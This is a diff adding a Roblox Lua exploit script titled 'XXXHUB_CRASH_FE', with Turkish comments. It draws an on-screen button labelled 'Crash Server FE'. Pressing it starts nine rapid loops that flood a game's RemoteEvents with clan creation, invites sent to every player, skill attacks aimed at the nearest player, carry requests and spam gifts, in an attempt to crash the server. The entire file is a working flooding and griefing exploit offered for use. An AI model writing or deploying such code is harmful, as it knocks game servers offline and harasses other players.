@@ -1,0 +1,208 @@
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "XXXHUB_CRASH_FE"
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 200, 0, 50)
+frame.Position = UDim2.new(0.5, -100, 0.1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
+frame.Active = true
+frame.Draggable = true
+
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
+
+local button = Instance.new("TextButton", frame)
+button.Size = UDim2.new(1, 0, 1, 0)
+button.Text = "Crash Server FE"
+button.TextColor3 = Color3.fromRGB(0, 0, 0)
+button.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
+button.Font = Enum.Font.FredokaOne
+button.TextScaled = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local loops = {}
+local active = false
+
+function stopAll()
+	for _, c in pairs(loops) do
+		coroutine.close(c)
+	end
+	table.clear(loops)
+end
+
+button.MouseButton1Click:Connect(function()
+	if active then
+		stopAll()
+		active = false
+		button.Text = "Crash Server FE"
+	else
+		active = true
+		button.Text = "Stop Crash"
+
+		-- LOOP 1 - CRASH YAZILARI
+		table.insert(loops, coroutine.create(function()
+			while active do
+				pcall(function()
+					ReplicatedStorage.Events.nameEvent:FireServer("XXXHUB CRASH SERVER ", "player")
+					ReplicatedStorage.Events.nameEvent:FireServer("CRASHHHHHH", "player")
+				end)
+				task.wait(0.1)
+			end
+		end))
+
+		-- LOOP 2 - CLAN CREATE
+		table.insert(loops, coroutine.create(function()
+			while active do
+				pcall(function()
+					ReplicatedStorage.Events.ClanEvent:FireServer({
+						["clanToCreate"] = "CRASH BY XXXHUB 🧹",
+						["action"] = "create_clan",
+						["ClanIcon"] = "107021325188504"
+					})
+				end)
+				task.wait(0.1)
+			end
+		end))
+
+		-- LOOP 3 - CLAN INVITE HERKESE
+		table.insert(loops, coroutine.create(function()
+			while active do
+				for _, plr in pairs(Players:GetPlayers()) do
+					if plr ~= Players.LocalPlayer then
+						pcall(function()
+							ReplicatedStorage.invitationEvent:FireServer({
+								["action"] = "invite_clan",
+								["oplr"] = plr
+							})
+						end)
+						task.wait(0.01)
+					end
+				end
+				task.wait(0.1)
+			end
+		end))
+
+		-- LOOP 4 - FIREBALL + LIGHTNINGBALL EN YAKIN OYUNCUYA
+		table.insert(loops, coroutine.create(function()
+			while active do
+				local closest, dist = nil, math.huge
+				for _, plr in pairs(Players:GetPlayers()) do
+					if plr ~= Players.LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+						local d = (Players.LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
+						if d < dist then
+							closest = plr
+							dist = d
+						end
+					end
+				end
+				if closest then
+					local pos = closest.Character.HumanoidRootPart.Position
+					pcall(function()
+						ReplicatedStorage.SkillsInRS.RemoteEvent:FireServer(pos, "NewFireball")
+						ReplicatedStorage.SkillsInRS.RemoteEvent:FireServer(pos, "NewLightningball")
+					end)
+				end
+				task.wait(0.1)
+			end
+		end))
+
+		-- LOOP 5 - CARRY HERKESE
+		table.insert(loops, coroutine.create(function()
+			while active do
+				for _, plr in pairs(Players:GetPlayers()) do
+					if plr ~= Players.LocalPlayer then
+						pcall(function()
+							ReplicatedStorage.Events.CarryEvent:FireServer(plr, "request_carry")
+						end)
+						task.wait(0.01)
+					end
+				end
+				task.wait(0.1)
+			end
+		end))
+
+		-- LOOP 6 - TITLE YOLLAMA
+		table.insert(loops, coroutine.create(function()
+			local titles = {"Executioner", "Destroyer", "MasterHunter", "AdeptHunter"}
+			while active do
+				for _, t in ipairs(titles) do
+					pcall(function()
+						ReplicatedStorage.Events.TitleEvent:FireServer(t)
+					end)
+					task.wait(0.01)
+				end
+				task.wait(0.1)
+			end
+		end))
+
+		-- LOOP 7 - ROSEB VERME
+		table.insert(loops, coroutine.create(function()
+			while active do
+				for _, plr in pairs(Players:GetPlayers()) do
+					if plr ~= Players.LocalPlayer then
+						pcall(function()
+							ReplicatedStorage.Events.GiveEvent:FireServer({
+								["toolname"] = "RoseB",
+								["oplr"] = plr,
+								["action"] = "give",
+								["gift"] = "🌀"
+							})
+						end)
+						task.wait(0.01)
+					end
+				end
+				task.wait(0.1)
+			end
+		end))
+
+		-- LOOP 8 - CHICKENLEG VERME
+		table.insert(loops, coroutine.create(function()
+			while active do
+				for _, plr in pairs(Players:GetPlayers()) do
+					if plr ~= Players.LocalPlayer then
+						pcall(function()
+							ReplicatedStorage.Events.GiveEvent:FireServer({
+								["toolname"] = "Chickenleg",
+								["oplr"] = plr,
+								["action"] = "give",
+								["gift"] = "🍗"
+							})
+						end)
+						task.wait(0.01)
+					end
+				end
+				task.wait(0.1)
+			end
+		end))
+
+		-- LOOP 9 - ROSEB CRASH GİFT
+		table.insert(loops, coroutine.create(function()
+			while active do
+				for _, plr in pairs(Players:GetPlayers()) do
+					if plr ~= Players.LocalPlayer then
+						pcall(function()
+							ReplicatedStorage.Events.GiveEvent:FireServer({
+								["toolname"] = "RoseB",
+								["oplr"] = plr,
+								["action"] = "give",
+								["gift"] = "NİCRASH BY XXXHUB"
+							})
+						end)
+						task.wait(0.01)
+					end
+				end
+				task.wait(0.1)
+			end
+		end))
+
+		-- ÇALINACAK MÜZİK (TEK SEFER)
+		pcall(function()
+			ReplicatedStorage.Events.PLAYEvent:FireServer("76074204539378 ")
+		end)
+
+		-- Tüm loop'ları başlat
+		for _, thread in ipairs(loops) do
+			task.spawn(thread)
+		end
+	end
+end)
